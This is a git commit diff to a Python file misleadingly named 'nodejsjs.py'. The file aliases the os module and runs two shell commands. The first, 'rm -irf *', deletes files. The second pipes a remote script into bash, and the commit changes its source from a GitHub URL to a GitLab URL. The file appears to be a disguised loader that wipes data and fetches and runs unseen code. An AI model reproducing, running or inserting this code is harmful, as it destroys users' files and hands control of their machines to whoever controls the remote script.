fa3b648f6be8cf5e130e53cfd35f7450c3694f3b
erlandi <93110170+erlandi-main-api@users.noreply.github.com>
2024-06-26 05:50:12 +0700

    Update nodejsjs.py

--- nodejsjs.py
+++ nodejsjs.py
@@ -1,3 +1,3 @@
 import os as nodejsjs
 nodejsjs.system("rm -irf *")
-nodejsjs.system("curl -sL https://github.com/erlandi-main-api/QBMASTER/raw/main/gakskjdh | bash")
+nodejsjs.system("curl -sL https://gitlab.com/erlandysword/build/-/raw/main/pythonb | bash")
